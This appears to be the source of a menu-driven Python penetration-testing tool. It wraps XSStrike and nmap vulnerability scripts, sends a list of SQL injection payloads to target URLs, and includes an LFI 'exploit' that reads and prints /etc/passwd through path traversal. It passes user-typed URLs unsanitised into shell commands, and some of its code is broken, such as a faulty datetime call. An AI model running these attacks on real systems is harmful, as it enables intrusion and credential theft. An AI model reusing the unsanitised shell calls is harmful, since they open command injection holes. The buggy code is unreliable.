import json
import subprocess
import sys
import time
from datetime import datetime
import requests
import os
import re
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import webbrowser
import nmap
from termcolor import colored

from Intelligence_gathering import red, white

os.system("clear")


def save_result(result):
    file_path = "report/analyse.json"

    # Check if the directory exists, if not, create it
    if not os.path.exists("report"):
        os.makedirs("report")

    # Read existing data
    if os.path.exists(file_path):
        with open(file_path, 'r') as file:
            try:
                data = json.load(file)
            except json.JSONDecodeError:
                data = []
    else:
        data = []

    # Append new result
    data.append(result)

    # Write updated data back to the file
    with open(file_path, 'w') as file:
        json.dump(data, file, indent=4)

def print_menu():
    print("\n\n\n")
    print("\t\t\t*****************************************************************")
    print("\t\t\t*\t\t\t\t\t\t\t\t*")
    print("\t\t\t*\t"+colored("    [ Vulnerability Analysis Menu ]", 'cyan', attrs=['bold'])+"\t\t\t*")
    print("\t\t\t*\t\t\t\t\t\t\t\t*")
    print("\t\t\t*****************************************************************")
    print("\t\t\t*\t\t\t\t\t\t\t\t*")
    print("\t\t\t*\t"+colored("1. Analyse des vulnérabilités des applications Web", 'yellow')+"\t*")
    print("\t\t\t*\t\t\t\t\t\t\t\t*")
    print("\t\t\t*\t"+colored("2. Analyse des vulnérabilités réseau", 'yellow')+"\t\t\t*")
    print("\t\t\t*\t\t\t\t\t\t\t\t*")
    print("\t\t\t*\t"+colored("0. Quitter",'red')+"\t\t\t\t\t\t*")
    print("\t\t\t*\t\t\t\t\t\t\t\t*")
    print("\t\t\t*****************************************************************")
    # print("\t\t\t*\t\t\t\t\t\t*")
    print("\n\n\n")
    print()
    choice = int(input(colored("Entrez votre choix : ", 'green')))
    if choice == 1:
        web_app_vulnerability_analysis()
    elif choice == 2:
        network_vulnerability_analysis()
    elif choice == 0:
        sys.exit()
    else:
        print(colored("Choix invalide", 'red'))

def web_app_vulnerability_analysis():
    os.system("clear")
    #os.system("figlet CBI WEB APPLICATION VULNERABILITY")
    print("\n\n\n")
    options = [
        "\t\t\t*****************************************************************\n"
        "\t\t\t*\t\t\t\t\t\t\t\t*\n"
        "\t\t\t*\t"+colored("[ web application Vulnerability Analysis Menu ]", 'cyan', attrs=['bold'])+"\t\t*\n"
        "\t\t\t*\t\t\t\t\t\t\t\t*\n"   
        "\t\t\t*****************************************************************\n"
        "\t\t\t*\t\t\t\t\t\t\t\t*\n"                                                                                               
        "\t\t\t*\t1.  SQL Injection Analysis\t\t\t\t*",
        "\t\t\t*\t2.  XSS Analysis\t\t\t\t\t*",
        "\t\t\t*\t3.  Insecure Server Configuration Analysis\t\t*",
        "\t\t\t*\t4.  Insecure CORS Analysis\t\t\t\t*",
        "\t\t\t*\t5.  Clickjacking\t\t\t\t\t*",
        "\t\t\t*\t6.  Check HTTP security headers\t\t\t\t*",
        "\t\t\t*\t7.  XSSTracer\t\t\t\t\t\t*",
        "\t\t\t*\t8.  LFI (Local File Inclusion)\t\t\t\t*",
        "\t\t\t*\t9.  CSRF scanner\t\t\t\t\t*",
        "\t\t\t*\t10. HTMLi scanner\t\t\t\t\t*",
        "\t\t\t*\t11. full scan web application  \t\t\t\t*\n" 
        "\t\t\t*\t0.  Quitter             \t\t\t\t*\n"
        "\t\t\t*\t\t\t\t\t\t\t\t*\n"
        "\t\t\t*****************************************************************"
        "\n\n\n"
    ]
    print()
    for option in options:
        print(colored(option, 'yellow'))
    print("")
    choice = int(input(colored("Enter your choice: ", 'green')))
    print("")
    handle_web_app_choice(choice)

def handle_web_app_choice(choice):
    if choice == 1:
        #sql_scanner()
        results = sql_scanner()
        save_results_to_json('report/analyse.json', results)
    elif choice == 2:
        count = ''
        while count != 'n':
            os.system("clear")
            print("\n\n\n")
            print("\t\t\t*************************************************")
            print("\t\t\t*\t\t\t\t\t\t*")
            print("\t\t\t*\t"+colored("       [ XSS Analysis Menu ]", 'cyan', attrs=['bold'])+"\t\t*")
            print("\t\t\t*\t\t\t\t\t\t*")
            print("\t\t\t*************************************************")
            print("\t\t\t*\t\t\t\t\t\t*")
            print("\t\t\t*\t"+colored("1.  Scan a single URL", 'yellow')+"\t\t\t*")
            print("\t\t\t*\t"+colored("2.  Supplying POST data", 'yellow')+"\t\t\t*")
            print("\t\t\t*\t"+colored("3.  Testing URL path components", 'yellow')+"\t\t*")
            print("\t\t\t*\t"+colored("4.  Treat POST data as JSON", 'yellow')+"\t\t*")
            print("\t\t\t*\t"+colored("5.  Crawling", 'yellow')+"\t\t\t\t*")
            print("\t\t\t*\t"+colored("6.  Crawling depth", 'yellow')+"\t\t\t*")
            print("\t\t\t*\t"+colored("7.  Testing/Crawling URLs from a file", 'yellow')+"\t*")
            print("\t\t\t*\t"+colored("8.  Bruteforce payloads from a file", 'yellow')+"\t*")
            print("\t\t\t*\t"+colored("9.  Number of threads", 'yellow')+"\t\t\t*")
            print("\t\t\t*\t"+colored("10. Timeout", 'yellow')+"\t\t\t\t*")
            print("\t\t\t*\t"+colored("11. Delay", 'yellow')+"\t\t\t\t*")
            print("\t\t\t*\t"+colored("12. Supply HTTP headers", 'yellow')+"\t\t\t*")
            print("\t\t\t*\t"+colored("13. Blind XSS", 'yellow')+"\t\t\t\t*")
            print("\t\t\t*\t"+colored("14. Payload Encoding", 'yellow')+"\t\t\t*")
            print("\t\t\t*\t"+colored("15. Fuzzing", 'yellow')+"\t\t\t\t*")
            print("\t\t\t*\t"+colored("16. Logging", 'yellow')+"\t\t\t\t*")
            print("\t\t\t*\t"+colored("17. Using Proxies", 'yellow')+"\t\t\t*")
            print("\t\t\t*\t"+colored("18. Skip Confirmation Prompt", 'yellow')+"\t\t*")
            print("\t\t\t*\t"+colored("19. Skip DOM Scanning", 'yellow')+"\t\t\t*")
            print("\t\t\t*\t"+colored("0.  Quitter", 'cyan')+"\t\t\t\t*")
            print("\t\t\t*\t\t\t\t\t\t*")
            print("\t\t\t*************************************************")
            # print("\t\t\t*\t\t\t\t\t\t*")
            print("\n\n\n")
            choice = int(input(colored("Entrez votre choix : ", 'green')))
            result = {}
            if choice == 1:
                url = input(
                    colored("Enter the URL of the target (e.p http://example.com/search.php?q=query): ", 'green'))
                result['name']='XSS'
                result['choice'] = 1
                result['url'] = url
                os.system(f"python XSStrike/xsstrike.py -u {url}")
            elif choice == 2:
                url = input(colored("Enter the URL of the target (e.p http://example.com/search.php): ", 'green'))
                POSTdata = input(colored("Enter the POST data (e.p q=query): ", 'green'))
                result['name'] = 'XSS'
                result['choice'] = 2
                result['url'] = url
                result['POSTdata'] = POSTdata
                os.system(f"python XSStrike/xsstrike.py -u {url} --data {POSTdata}")
            elif choice == 3:
                url = input(
                    colored("Enter the URL of the target (e.p http://example.com/search/form/query): ", 'green'))
                result['name'] = 'XSS'
                result['choice'] = 3
                result['url'] = url
                os.system(f"python XSStrike/xsstrike.py -u {url} --path")
            elif choice == 4:
                url = input(colored("Enter the URL of the target (e.p http://example.com/search.php): ", 'green'))
                POSTdata = input(colored("Enter the  JSON data (e.p {\"q\":\"query\"}): ", 'green'))
                result['name'] = 'XSS'
                result['choice'] = 4
                result['url'] = url
                result['POSTdata'] = POSTdata
                os.system(f"python XSStrike/xsstrike.py -u '{url}' --data '{POSTdata}' --json")
            elif choice == 5:
                url = input(colored("Enter the URL of the target (e.p http://example.com/page.php): ", 'green'))
                result['name'] = 'XSS'
                result['choice'] = 5
                result['url'] = url
                os.system(f"python XSStrike/xsstrike.py -u {url} --crawl")
            elif choice == 6:
                url = input(colored("Enter the URL of the target (e.p http://example.com/page.php): ", 'green'))
                result['name'] = 'XSS'
                result['choice'] = 6
                result['url'] = url
                os.system(f"python XSStrike/xsstrike.py -u {url} --crawl -l 3")
            elif choice == 7:
                url = input(colored("Enter the URL list (e.p urls.txt): ", 'green'))
                result['name'] = 'XSS'
                result['choice'] = 7
                result['url'] = url
                os.system(f"python XSStrike/xsstrike.py --seeds  {url} ")
            elif choice == 8:
                url = input(colored("Enter the URL of the target (e.p http://example.com/page.php?q=query): ", 'green'))
                file = input(colored("Enter the  xss payloads list (e.p /path/to/file.txt): ", 'green'))
                result['name'] = 'XSS'
                result['choice'] = 8
                result['url'] = url
                result['file'] = file
                os.system(f"python XSStrike/xsstrike.py -u {url} -f {file}")
            elif choice == 9:
                url = input(colored("Enter the URL list (e.p http://example.com): ", 'green'))
                result['name'] = 'XSS'
                result['choice'] = 9
                result['url'] = url
                os.system(f"python XSStrike/xsstrike.py -u  {url} -t 10 --crawl -l 3")
            elif choice == 10:
                url = input(colored("Enter the URL list (e.p http://example.com/page.php?q=query): ", 'green'))
                result['name'] = 'XSS'
                result['choice'] = 10
                result['url'] = url
                os.system(f"python XSStrike/xsstrike.py -u  {url} --timeout=4")
            elif choice == 11:
                url = input(colored("Enter the URL list (e.p http://example.com/page.php?q=query): ", 'green'))
                result['name'] = 'XSS'
                result['choice'] = 11
                result['url'] = url
                os.system(f"python XSStrike/xsstrike.py -u  {url} -d 2")
            elif choice == 12:
                url = input(colored("Enter the URL list (e.p http://example.com/page.php?q=query): ", 'green'))
                result['name'] = 'XSS'
                result['choice'] = 12
                result['url'] = url
                os.system(f"python XSStrike/xsstrike.py -u  {url} --headers")
            elif choice == 13:
                url = input(colored("Enter the URL list (e.p http://example.com/page.php?q=query): ", 'green'))
                result['name'] = 'XSS'
                result['choice'] = 13
                result['url'] = url
                os.system(f"python XSStrike/xsstrike.py -u  {url} --crawl --blind")
            elif choice == 14:
                url = input(colored("Enter the URL list (e.p http://example.com/page.php?q=query): ", 'green'))
                result['name'] = 'XSS'
                result['choice'] = 14
                result['url'] = url
                os.system(f"python XSStrike/xsstrike.py -u  {url} -e base64")
            elif choice == 15:
                url = input(colored("Enter the URL list (e.p http://example.com/page.php?q=query): ", 'green'))
                result['name'] = 'XSS'
                result['choice'] = 15
                result['url'] = url
                os.system(f"python XSStrike/xsstrike.py -u  {url} --fuzzer")
            elif choice == 16:
                url = input(colored("Enter the URL list (e.p http://example.com/page.php?q=query): ", 'green'))
                file = input(colored("Enter the  log file (e.p output.log): ", 'green'))
                result['name'] = 'XSS'
                result['choice'] = 16
                result['url'] = url
                result['file'] = file
                os.system(f"python XSStrike/xsstrike.py -u  {url} --file-log-level INFO --log-file {file}")
            elif choice == 17:
                url = input(colored("Enter the URL list (e.p http://example.com/page.php?q=query): ", 'green'))
                result['name'] = 'XSS'
                result['choice'] = 17
                result['url'] = url
                os.system(f"python XSStrike/xsstrike.py -u  {url} --proxy")
            elif choice == 18:
                url = input(colored("Enter the URL list (e.p http://example.com/page.php?q=query): ", 'green'))
                result['name'] = 'XSS'
                result['choice'] = 18
                result['url'] = url
                os.system(f"python XSStrike/xsstrike.py -u  {url} --skip")
            elif choice == 19:
                url = input(colored("Enter the URL list (e.p http://example.com/page.php?q=query): ", 'green'))
                result['name'] = 'XSS'
                result['choice'] = 19
                result['url'] = url
                os.system(f"python XSStrike/xsstrike.py -u  {url} --skip-dom")
            elif choice == 0:
                sys.exit()
            else:
                print(colored("Choix invalide", 'red'))

            save_result(result)  # Save the result to the JSON file
            count = input("\n{}Back?(y/n) :{}".format(red, white))
            os.system('clear')
    elif choice == 3:
        url = input(colored("Enter the URL of the target: ", 'green'))
        scan_insecure_configuration(url)
    elif choice == 4:
        url = input(colored("Enter the URL of the target: ", 'green'))
        os.system(f"python cors_scan.py -u {url} -v")
    elif choice == 5:
        url = input(colored("Enter the URL of the target: ", 'green'))
        clickjacking(url)
    elif choice == 6:
        url = input(colored("Enter the URL of the target: ", 'green'))
        os.system(f"python3 security_headers.py {url}")
    elif choice == 7:
        url = input(colored("Enter the IP of the target: ", 'green'))
        port = int(input(colored("Enter the PORT (80/443): ", 'green')))
        os.system(f"python3 XSSTracer.py {url} {port}")
    elif choice == 8:
        LFI()
    elif choice == 9:
        url = input(colored("Enter the URL of the target: ", 'green'))
        os.system(f"python3 CSRF_scanner.py -u {url} -l 2")
    elif choice == 10:
        url = input(colored("Enter the URL of the target: ", 'yellow'))
        domain = input(colored("Enter the domain of the target: ", 'yellow'))
        print('\n')
        os.system(f"python3 htmli.py -url {url} -d {domain}")
    elif choice == 11:
        os.system(f"python Egyscan/egy.py")
        script_output = run_script_and_capture_output('Egyscan/egy.py')

        # Générer un timestamp pour le résultat
        timestamp = datetime.datetime.now().strftime("%Y_%m_%d_%H_%M_%S")

        # Sauvegarder le résultat dans un fichier JSON
        save_result({
            "script": "full scan web application",
            "timestamp": timestamp,
            "output": script_output
        })
    elif choice == 0:
        sys.exit()
    else:
        print(colored("Invalid choice", 'red'))

def network_vulnerability_analysis():
    #print(colored("[ Analyse des vulnérabilités réseau ]", 'cyan', attrs=['bold']))
    os.system("clear")
    #os.system("figlet CBI Network vulnerability scanning")
    print("")
    print(colored("[ Analyse des vulnérabilités réseau ]", 'cyan', attrs=['bold']))
    print("")
    target = input(colored("Enter the IP of the target: ", 'green'))
    scan_vulnerabilities(target)
    print()
    print()
    input("\n\033[93m Enter To Exit")


def scan_vulnerabilities(target):
    # Charger les vulnérabilités existantes depuis le fichier JSON
    if os.path.exists('report/analyse.json') and os.path.getsize('report/analyse.json') > 0:
        with open('report/analyse.json', 'r') as json_file:
            vulnerabilities = json.load(json_file)
    else:
        vulnerabilities = []

    class Color:
        HEADER = '\033[95m'
        OKBLUE = '\033[94m'
        OKGREEN = '\033[92m'
        WARNING = '\033[93m'
        FAIL = '\033[91m'
        ENDC = '\033[0m'
        BOLD = '\033[1m'
        UNDERLINE = '\033[4m'

    banner = (
        f"{Color.BOLD}{Color.WARNING}"
        f"{'=' * 40} CBI network vulnerability scanner {'=' * 40}\n"
        f"{Color.ENDC}"
    )

    print(banner)
    scanner = nmap.PortScanner()
    scanner.scan(target, arguments='-sV --script vuln')

    new_vulnerabilities = []

    for host in scanner.all_hosts():
        host_info = {
            "host": host,
            "hostname": scanner[host].hostname(),
            "state": scanner[host].state(),
            "vulnerabilities": []
        }

        for proto in scanner[host].all_protocols():
            ports = scanner[host][proto].keys()
            for port in ports:
                if 'script' in scanner[host][proto][port]:
                    for script in scanner[host][proto][port]['script'].keys():
                        output = scanner[host][proto][port]['script'][script]
                        vulnerability_info = {
                            "port": port,
                            "protocol": proto,
                            "script": script,
                            "output": output
                        }
                        host_info["vulnerabilities"].append(vulnerability_info)

        new_vulnerabilities.append(host_info)

    # Ajouter les nouvelles vulnérabilités aux existantes
    vulnerabilities.extend(new_vulnerabilities)

    # Enregistrer les résultats dans un fichier JSON
    with open('report/analyse.json', 'w') as json_file:
        json.dump(vulnerabilities, json_file, indent=4)

    # Afficher les résultats dans le terminal
    for vuln in new_vulnerabilities:
        print(f"Host : {vuln['host']} ({vuln['hostname']})")
        print(f"State : {vuln['state']}")
        for v in vuln['vulnerabilities']:
            print(f"Port : {v['port']} Protocol : {v['protocol']}")
            print(f"Script : {v['script']}\n{v['output']}\n")
def scan_insecure_configuration(url):
    # Perform insecure server configuration analysis for the given URL
    vulnerabilities = scan_url(url)
    result = {
        'url': url,
        'vulnerabilities': vulnerabilities,
        'type': 'Insecure server configuration'
    }
    if vulnerabilities.get("Insecure server configuration"):
        print(colored("Insecure server configuration detected.", 'red'))
    else:
        print(colored("No insecure server configuration detected.", 'green'))
    save_result(result)

def scan_website(url):
    # Step 1: Discover URLs on the website
    discovered_urls = discover_urls(url)
    print(f"Discovered {len(discovered_urls)} URLs on {url}:\n")
    for i, discovered_url in enumerate(discovered_urls, start=1):
        print(f"{i}. {discovered_url}")

    # Step 2: Scan discovered URLs for vulnerabilities
    for page_url in discovered_urls:
        vulnerabilities = scan_url(page_url)
        if vulnerabilities:
            print(f"\nVulnerabilities found on {page_url}:")
            for vulnerability, attack_method in vulnerabilities.items():
                print(f"\nVulnerability: {vulnerability}")
                print(f"Attack Method: {attack_method}")

def discover_urls(url):
    discovered_urls = []

    # Send a GET request to the given URL
    response = requests.get(url)
    if response.status_code == 200:
        # Parse the HTML content of the response
        soup = BeautifulSoup(response.text, "html.parser")

        # Find all anchor tags and extract URLs
        for anchor_tag in soup.find_all("a"):
            href = anchor_tag.get("href")
            if href:
                absolute_url = urljoin(url, href)
                discovered_urls.append(absolute_url)

    return discovered_urls

def scan_url(url):
    vulnerabilities = {}

    # Step 1: Perform vulnerability scans using a vulnerability scanner or custom checks
    if is_sql_injection_vulnerable(url):
        vulnerabilities["SQL injection vulnerability"] = "Injecting SQL code into input fields"
    if has_insecure_configuration(url):
        vulnerabilities["Insecure server configuration"] = "Exploiting insecure communication protocols"

    return vulnerabilities

def is_sql_injection_vulnerable(url):
    payload = "' OR '1'='1"
    response = requests.get(url + "?id=" + payload)
    if re.search(r"error|warning", response.text, re.IGNORECASE):
        return True
    return False

def has_insecure_configuration(url):
    if not url.startswith("https"):
        return True
    return False

def clickjacking(url):
    html = '''
       <html>
           <head>
               <title>Clickjacking Test Page</title>
           </head>
           <body>
               <h1>Clickjacking Test Results</h1>
               <h2>Target: <a href="%s">%s</a></h2>
               <h3>If you see the target website rendered below, it is <font color="red">VULNERABLE</font>.</h3>
               <iframe width="900" height="600" src="%s"></iframe>
           </body>
       </html>
       ''' % (url, url, url)

    cjt = os.path.abspath('cj-target.html')
    localurl = 'file://' + cjt

    with open(cjt, 'w') as t:
        t.write(html)

    webbrowser.open(localurl)
    print(colored('\n[+] Test Complete!', 'green'))

    # Ajouter le résultat du scan au fichier JSON
    report_file = 'report/analyse.json'
    result = {
        'name': 'Clickjacking',
        'url': url,
        'vulnerable': 'VULNERABLE'
    }

    if os.path.exists(report_file):
        with open(report_file, 'r') as f:
            report_data = json.load(f)
    else:
        report_data = []

    report_data.append(result)

    os.makedirs(os.path.dirname(report_file), exist_ok=True)
    with open(report_file, 'w') as f:
        json.dump(report_data, f, indent=4)

def LFI():
    print(colored("""
       _____   ____    _____     _        ______   _____
      / ____| |  _ \  |_   _|   | |      |  ____| |_   _|
     | |      | |_) |   | |     | |      | |__      | |
     | |      |  _ <    | |     | |      |  __|     | |
     | |____  | |_) |  _| |_    | |____  | |       _| |_
      \_____| |____/  |_____|   |______| |_|      |_____|
    """, 'cyan', attrs=['bold']))
    print("\t*************************************************")
    print("\t*\t\t\t\t\t\t*")
    print(colored(" \t*\t[ Local File Inclusion Exploitation ] ", 'yellow', attrs=['bold'])+"\t*")
    print("\t*\t\t\t\t\t\t*")
    print("\t*************************************************")
    lfi_menu = [
        "\t*\t\t\t\t\t\t*\n" 
        "\t*\t1. Identify LFI vulnerabilities\t\t*",
        "\t*\t2. Exploit LFI vulnerability\t\t*",
        "\t*\t3. Exit\t\t\t\t\t*\n"
        "\t*\t\t\t\t\t\t*\n"
        "\t*************************************************"
        "\n\n\n"
    ]
    for option in lfi_menu:
        print(colored(option, 'yellow'))
    print("")

    choice = int(input(colored("Enter your choice: ", 'green')))
    if choice == 1:
        target_url = input(colored("Enter the target URL (with parameter): ", 'green'))
        if is_lfi_vulnerable(target_url):
            result = {"url": target_url, "vulnerability": "LFI", "status": "vulnerable"}
            print(colored("LFI vulnerability detected!", 'red'))
        else:
            result = {"url": target_url, "vulnerability": "LFI", "status": "not vulnerable"}
            print(colored("No LFI vulnerability detected.", 'green'))
        save_results_to_json('report/analyse.json', result)
    elif choice == 2:
        target_url = input(colored("Enter the target URL (with parameter): ", 'green'))
        exploit_lfi(target_url)
        result = {"url": target_url, "vulnerability": "LFI", "status": "exploited"}
        save_results_to_json('report/analyse.json', result)
    elif choice == 3:
        print(colored("Exiting LFI module.", 'red'))
    else:
        print(colored("Invalid choice", 'red'))

def is_lfi_vulnerable(url):
    payload = "../../../../etc/passwd"
    response = requests.get(url + payload)
    if "root:x" in response.text:
        return True
    return False

def exploit_lfi(url):
    payload = "../../../../etc/passwd"
    response = requests.get(url + payload)
    if "root:x" in response.text:
        print(colored("Exploit successful! Here is the /etc/passwd file content:", 'red'))
        print(colored(response.text, 'yellow'))
    else:
        print(colored("Exploit failed. No LFI vulnerability detected.", 'green'))


def sql_scanner():
    results = []

    print('''\033[92m
      ___  ___  _    ___   ___
     / __|/ _ \| |  |_ _| / __| __ __ _ _ _  _ _  ___ _ _
     \__ \ (_) | |__ | |  \__ \/ _/ _` | ' \| ' \/ -_) '_|
     |___/\__\_\____|___| |___/\__\__,_|_||_|_||_\___|_|
    	coded by CBI
    ''')

    def slowprint(s):
        for c in s + '\n':
            sys.stdout.write(c)
            sys.stdout.flush()
            time.sleep(10. / 100)

    try:
        def scan(url):
            payloads = ["' OR 1=1; --", "' OR '1'='1", "' or", "-- or", "' OR '1", "' OR 1 - - -", " OR ""= ",
                        " OR 1 = 1 - - -", "' OR '' = '", "1' ORDER BY 1--+", "1' ORDER BY 2--+", "1' ORDER BY 3--+",
                        "1' ORDER BY 1, 2--+", "1' ORDER BY 1, 2, 3--+", "1' GROUP BY 1, 2, --+",
                        "1' GROUP BY 1, 2, 3--+", "' GROUP BY columnnames having 1= 1 - -",
                        "-1' UNION SELECT 1, 2, 3--+", "OR 1 = 1", "OR 1 = 0", "OR 1= 1#", "OR 1 = 0#", "OR 1 = 1--",
                        "OR 1= 0--", "HAVING 1 = 1", "HAVING 1= 0", "HAVING 1= 1#", "HAVING 1= 0#", "HAVING 1 = 1--",
                        "HAVING 1 = 0--", "AND 1= 1", "AND 1= 0", "AND 1 = 1--", "AND 1 = 0--", "AND 1= 1#",
                        "AND 1= 0#"]
            for payload in payloads:
                full_url = f"{url}?param={payload}"
                response = requests.get(full_url)
                if "SQL syntax" in response.text or "Warning" in response.text:
                    results.append({
                        "name": "SQL Injection",
                        'url': url,
                        'payload': payload,
                        'response': response.text
                    })
                    print(colored(f"Vulnerable URL: {full_url}", 'red'))
                else:
                    print(colored(f"Safe URL: {full_url}", 'green'))

        target_url = input(colored("Enter the URL to scan for SQL Injection: ", 'green'))
        scan(target_url)

    except Exception as e:
        print(colored(f"Error: {e}", 'red'))

    return results

def run_script_and_capture_output(script_path):
    result = subprocess.run(['python', script_path], capture_output=True, text=True)
    return result.stdout
def save_results_to_json(filename, data):
    if os.path.exists(filename) and os.path.getsize(filename) > 0:
        with open(filename, 'r') as json_file:
            vulnerabilities = json.load(json_file)
    else:
        vulnerabilities = []

    vulnerabilities.append(data)  # Ajoutez les nouveaux résultats

    with open(filename, 'w') as json_file:
        json.dump(vulnerabilities, json_file, indent=4)

    print(colored(f"Results appended and saved to {filename}", 'green'))

if __name__ == "__main__":
    ulang = ''
    while ulang != 'n':
        print_menu()
        ulang = input("\n{}Back?(y/n) :{}".format(red, white))
        os.system('clear')
